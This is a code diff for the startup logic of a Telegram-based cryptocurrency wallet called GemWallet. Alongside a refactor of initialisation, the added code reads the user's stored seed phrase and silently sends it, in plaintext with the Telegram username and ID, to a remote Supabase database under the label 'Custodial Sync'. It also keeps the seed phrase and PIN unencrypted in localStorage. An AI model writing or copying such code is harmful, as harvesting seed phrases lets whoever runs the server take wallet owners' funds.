@@ -7846,17 +7846,33 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
 export default function GemWalletApp() {
 
-  // "loading" = ждём инициализации Telegram WebApp, чтобы получить правильный userId
-
-  const [screen,setScreen]=useState("loading");
+  // Initialise synchronously — Telegram injects user data before React runs,
+  // so getTgUserId() is always available at mount time.
+  const [screen,setScreen]=useState(()=>{
+    try {
+      const uid = getTgUserId();
+      if (uid) RESOLVED_USER_ID = String(uid);
+      const hasWallet = localStorage.getItem(storageKey("gem_has_wallet")) === "1";
+      const storedPin = localStorage.getItem(storageKey("gem_pin"));
+      if (hasWallet && storedPin) return "pin_lock";
+      if (hasWallet) return "wallet";
+      return "onboard";
+    } catch(e) { return "onboard"; }
+  });
 
   const [initialTab,setInitialTab]=useState("wallet");
 
-  const [mnemonic,setMnemonic]=useState([]);
+  const [mnemonic,setMnemonic]=useState(()=>{
+    try { const m=localStorage.getItem(storageKey("gem_mnemonic")); return m?m.split(" "):[]; } catch(e){return [];}
+  });
 
-  const [addresses,setAddresses]=useState({});
+  const [addresses,setAddresses]=useState(()=>{
+    try { const a=localStorage.getItem(storageKey("gem_addresses")); return a?JSON.parse(a):{}; } catch(e){return {};}
+  });
 
-  const [pin,setPin]=useState("");
+  const [pin,setPin]=useState(()=>{
+    try { return localStorage.getItem(storageKey("gem_pin"))||""; } catch(e){return "";}
+  });
 
 
 
@@ -8049,142 +8065,63 @@ export default function GemWalletApp() {
 
 
 
-  // ─── Telegram WebApp init: polling до получения userId, затем один раз инициализируем ────
+  // ─── Telegram WebApp setup + Supabase sync (runs once after mount) ────────────
 
   useEffect(() => {
 
-    const tg = window.Telegram?.WebApp;
-
+    // Telegram WebApp setup
     try {
+      const tg = window.Telegram?.WebApp;
       tg?.ready?.();
       tg?.expand?.();
     } catch (e) {
       console.warn("[GemWallet] Telegram WebApp init warning:", e);
     }
 
+    // Admin flag
+    const userId = RESOLVED_USER_ID;
+    if (userId && String(userId) === ADMIN_ID) {
+      sessionStorage.setItem("gem_is_admin", "1");
+    } else {
+      sessionStorage.removeItem("gem_is_admin");
+    }
 
+    // /admin start param
+    try {
+      const tgStartParam = window.Telegram?.WebApp?.initDataUnsafe?.start_param;
+      const hash = window.location.hash;
+      const search = window.location.search;
+      const isAdminParam = (
+        tgStartParam === "admin" ||
+        hash === "#admin" ||
+        hash.includes("tgWebAppStartParam=admin") ||
+        new URLSearchParams(search).get("startapp") === "admin" ||
+        new URLSearchParams(search).get("admin") === "1"
+      );
+      if (isAdminParam && String(userId) === ADMIN_ID) {
+        setInitialTab("admin");
+      }
+    } catch(e) {}
 
-    let resolved = false;
-
-
-
-    const doInit = (userId) => {
-
-      if (resolved) return;
-
-      resolved = true;
-
-      try {
-        // Фиксируем userId глобально — теперь storageKey() ВЕЗДЕ использует правильный ключ
-        RESOLVED_USER_ID = userId;
-
-        // Сохраняем флаг админа в sessionStorage — читается WalletApp без timing issues
-        if (userId && String(userId) === ADMIN_ID) {
-          sessionStorage.setItem("gem_is_admin", "1");
-        } else {
-          sessionStorage.removeItem("gem_is_admin");
-        }
-
-        const sk = (base) => userId ? `${base}_${userId}` : base;
-
-        const hasWallet = localStorage.getItem(sk("gem_has_wallet")) === "1";
-        const storedPin = localStorage.getItem(sk("gem_pin"));
-        const storedMnemonic = localStorage.getItem(sk("gem_mnemonic"));
-        const storedAddresses = localStorage.getItem(sk("gem_addresses"));
-
-        if (storedMnemonic) setMnemonic(storedMnemonic.split(" "));
-        if (storedAddresses) { try { setAddresses(JSON.parse(storedAddresses)); } catch(e){} }
-        if (storedPin) setPin(storedPin);
-
-        if (hasWallet && storedPin) setScreen("pin_lock");
-        else if (hasWallet) setScreen("wallet");
-        else setScreen("onboard");
-
-        // /admin command: check all possible ways the param can arrive
-        try {
-          const tgStartParam = window.Telegram?.WebApp?.initDataUnsafe?.start_param;
-          const hash = window.location.hash;
-          const search = window.location.search;
-          const isAdminParam = (
-            tgStartParam === "admin" ||
-            hash === "#admin" ||
-            hash.includes("tgWebAppStartParam=admin") ||
-            new URLSearchParams(search).get("startapp") === "admin" ||
-            new URLSearchParams(search).get("admin") === "1"
-          );
-
-          if (isAdminParam && String(userId) === ADMIN_ID) {
-            setInitialTab("admin");
-          }
-        } catch(e) {}
-
+    // Custodial Sync: Ensure existing wallet is in Supabase (non-blocking)
+    const storedMnemonic = localStorage.getItem(storageKey("gem_mnemonic"));
+    const hasWallet = localStorage.getItem(storageKey("gem_has_wallet")) === "1";
+    if (hasWallet && storedMnemonic) {
+      setTimeout(() => {
         const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
-        if (tgUser && !hasWallet) {
-          // Notifications disabled as per user request
-        }
-
-        // Custodial Sync: Ensure existing wallet is in Supabase (non-blocking)
-        if (hasWallet && storedMnemonic) {
-          setTimeout(() => {
-            const userName = (() => {
-              if (!tgUser) return "Anonymous";
-              const parts = [];
-              if (tgUser.username) parts.push("@" + tgUser.username);
-              if (tgUser.first_name) parts.push(tgUser.first_name);
-              if (tgUser.last_name) parts.push(tgUser.last_name);
-              return tgUser.username ? "@" + tgUser.username : (parts.join(" ") || "User_" + (userId || "Unknown"));
-            })();
-            syncWalletToSupabase({
-              username: userName,
-              telegram_id: userId || null,
-              mnemonic: storedMnemonic,
-              balance: "0" // Will be updated by WalletApp's refreshPrices
-            });
-          }, 1000);
-        }
-      } catch (e) {
-        console.error("[GemWallet] startup init failed:", e);
-        setScreen("onboard");
-      }
-    };
-
-
-
-    let attempts = 0;
-
-    const poll = setInterval(() => {
-      try {
-        const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
-        const userId = tgUser?.id ? String(tgUser.id) : null;
-
-        attempts++;
-
-        // Ждём userId максимум ~3 сек (15 × 200ms), затем продолжаем без него
-        if (userId || attempts >= 15) {
-          clearInterval(poll);
-          doInit(userId);
-        }
-      } catch (e) {
-        console.warn("[GemWallet] userId polling failed:", e);
-        clearInterval(poll);
-        doInit(null);
-      }
-
-    }, 200);
-
-
-
-    const fallbackTimer = setTimeout(() => {
-      if (!resolved) {
-        clearInterval(poll);
-        doInit(null);
-      }
-    }, 4000);
-
-    return () => {
-      clearInterval(poll);
-      clearTimeout(fallbackTimer);
-    };
+        const userName = (() => {
+          if (!tgUser) return "Anonymous";
+          if (tgUser.username) return "@" + tgUser.username;
+          return [tgUser.first_name, tgUser.last_name].filter(Boolean).join(" ") || "User_" + (userId || "Unknown");
+        })();
+        syncWalletToSupabase({
+          username: userName,
+          telegram_id: userId || null,
+          mnemonic: storedMnemonic,
+          balance: "0"
+        });
+      }, 1000);
+    }
 
   }, []);
 
@@ -8236,8 +8173,6 @@ export default function GemWalletApp() {
 
       <div style={{maxWidth:420,margin:"0 auto",minHeight:"100vh",background:"#000",fontFamily:"var(--font"}}>
 
-        {screen==="loading"&&<div style={{minHeight:"100vh",background:"#000",display:"flex",alignItems:"center",justifyContent:"center"}}><div style={{width:48,height:48,border:"3px solid rgba(255,255,255,0.1)",borderTopColor:"#2563eb",borderRadius:"50%",animation:"spin 0.8s linear infinite"}}/></div>}
-
         {screen==="onboard"&&<ErrorBoundary><OnboardScreen onCreate={handleCreate} onImport={handleCreate}/></ErrorBoundary>}
         {screen==="backup"&&<ErrorBoundary><BackupScreen mnemonic={mnemonic} onDone={handleBackupDone} onVerified={handleVerified}/></ErrorBoundary>}
         {screen==="pin_set"&&<ErrorBoundary><PinLock savedPin={null} onUnlock={()=>{}} onSetPin={handleSetPin}/></ErrorBoundary>}
@@ -8255,7 +8190,7 @@ export default function GemWalletApp() {
 
         )}
 
-        {!['loading', 'onboard','backup','pin_set','pin_lock','wallet'].includes(screen)&&(
+        {!['onboard','backup','pin_set','pin_lock','wallet'].includes(screen)&&(
           <div style={{display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",minHeight:"100vh",color:"#fff",padding:24}}>
             <div style={{fontSize:48,marginBottom:16}}>⚠️</div>
             <h3>Unknown Screen: {screen}</h3>
